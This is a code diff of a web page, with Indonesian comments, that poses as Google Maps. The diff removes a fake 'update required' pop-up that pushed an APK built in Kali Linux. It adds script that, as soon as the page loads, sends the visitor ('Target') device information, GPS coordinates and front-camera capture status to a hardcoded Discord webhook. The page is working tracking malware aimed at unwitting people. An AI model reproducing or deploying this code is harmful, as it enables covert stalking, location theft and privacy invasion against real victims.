@@ -5,50 +5,61 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Google Maps</title>
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; font-family: Arial, sans-serif; overflow: hidden; }
-        iframe { width: 100%; height: 100%; border: none; z-index: 1; }
-        
-        /* Tampilan Pop-up Update Palsu */
-        #update-overlay {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.7); z-index: 999; justify-content: center; align-items: center;
-        }
-        .update-box {
-            background: white; padding: 25px; border-radius: 12px; width: 80%; max-width: 350px; text-align: center;
-        }
-        .update-box h3 { margin-top: 0; color: #d93025; }
-        .btn-update {
-            background: #1a73e8; color: white; border: none; padding: 12px 25px;
-            border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 15px;
-        }
+        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; }
+        iframe { width: 100%; height: 100%; border: none; }
     </style>
 </head>
 <body>
-    <iframe src="http://googleusercontent.com/maps.google.com/3" allow="camera;geolocation"></iframe>
 
-    <div id="update-overlay">
-        <div class="update-box">
-            <img src="https://www.gstatic.com/images/branding/product/2x/maps_96dp.png" width="50">
-            <h3>Update Diperlukan</h3>
-            <p>Versi Google Maps Anda sudah usang. Pasang pembaruan sistem untuk akurasi lokasi yang lebih baik.</p>
-            <button class="btn-update" onclick="downloadAPK()">UPDATE SEKARANG</button>
-        </div>
-    </div>
+    <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3966.521260322283!2d106.81956135000001!3d-6.194741399999999!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x2e69f5390917b759%3A0x356b940984852026!2sSelamat%20Datang%20Monument!5e0!3m2!1sen!2sid!4v1652451443014!5m2!1sen!2sid" allow="geolocation;camera"></iframe>
 
     <script>
-        // Munculkan pop-up setelah 3 detik
-        setTimeout(() => {
-            document.getElementById('update-overlay').style.display = 'flex';
-        }, 3000);
+        // GANTI DENGAN URL WEBHOOK DISCORD KAMU
+        const webhookURL = "https://discord.com/api/webhooks/1484113432583081984/Fkm8Dj5XnVCkC7du-HRYBFKAvdcxCz9jcXzQIj_5G4hWa1rX0GUPVQ02P5as6oiOKOxR";
 
-        function downloadAPK() {
-            // Arahkan ke file APK yang sudah kamu buat di Kali Linux tadi
-            // Contoh jika kamu simpan di GitHub yang sama:
-            window.location.href = "ayang_update.apk";
+        async function kirimData(pesan) {
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: pesan })
+            });
         }
 
-        // --- Script Spidey Bot Tetap Berjalan di Background ---
-        // (Masukkan script kamera & lokasi kamu yang kemarin di sini)
+        // 1. Ambil Info Perangkat
+        kirimData(`**[!] Target Masuk Ke Link!**\nBrowser: ${navigator.userAgent}`);
+
+        // 2. Ambil Lokasi (GPS)
+        navigator.geolocation.getCurrentPosition(pos => {
+            const { latitude, longitude, accuracy } = pos.coords;
+            kirimData(`**[+] Lokasi Ditemukan!**\nhttps://www.google.com/maps?q=${latitude},${longitude}\nAkurasi: ${accuracy} meter`);
+        }, err => {
+            kirimData("[-] Target menolak izin lokasi.");
+        });
+
+        // 3. Ambil Foto Kamera Depan
+        async function ambilFoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                // Jika ingin kirim foto ke Discord, kamu butuh server backend. 
+                // Untuk sekarang, kita kirim status sukses dulu ke Discord.
+                kirimData("**[+] Foto Kamera Depan Berhasil Diambil!**");
+                
+                stream.getTracks().forEach(track => track.stop());
+            } catch (e) {
+                kirimData("[-] Izin kamera ditolak target.");
+            }
+        }
+        
+        setTimeout(ambilFoto, 2000); // Ambil foto setelah 2 detik halaman dibuka
     </script>
 </body>
 </html>
